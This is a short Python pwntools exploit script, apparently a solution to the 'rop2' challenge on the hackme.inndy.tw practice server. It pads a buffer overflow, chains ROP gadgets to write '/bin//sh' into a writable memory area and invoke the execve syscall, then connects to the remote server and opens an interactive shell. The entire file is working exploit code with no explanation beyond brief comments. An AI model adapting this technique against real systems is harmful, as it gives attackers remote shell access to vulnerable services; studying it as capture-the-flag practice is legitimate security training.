#!/usr/bin/env python3
from pwn import *

context(arch='x86', terminal=['tmux', 'neww'])
elf = ELF('./rop2')

writable = 0x0804a018 # Get writable area from objdump -x

# search usable gadgets from ROPgadget
pop_eax_edx_ecx = 0x0804843e
syscall = 0x0804847c  # syscall@plt
pop_eax_ptr = 0x0804844e # 0x0804844e : pop dword ptr [eax] ; ret

payload = b''
payload += b'aaaabaaacaaadaaa'

# execve(ebx, ecx, edx)
# ebx = address of "/bin//sh"
# ecx = 0
# edx = 0

payload += p32(pop_eax_edx_ecx)
payload += p32(writable)
payload += p32(0)
payload += p32(0)

payload += p32(pop_eax_ptr)
payload += b'/bin'

payload += p32(pop_eax_edx_ecx)
payload += p32(writable+4)
payload += p32(0)
payload += p32(0)

payload += p32(pop_eax_ptr)
payload += b'//sh'

payload += p32(syscall)
payload += p32(0x0b)
payload += p32(writable)
payload += p32(0)
payload += p32(0)

#r = process('./rop2')
#gdb.attach(r)
r = remote('hackme.inndy.tw', 7703)
r.sendline(payload)

r.interactive()

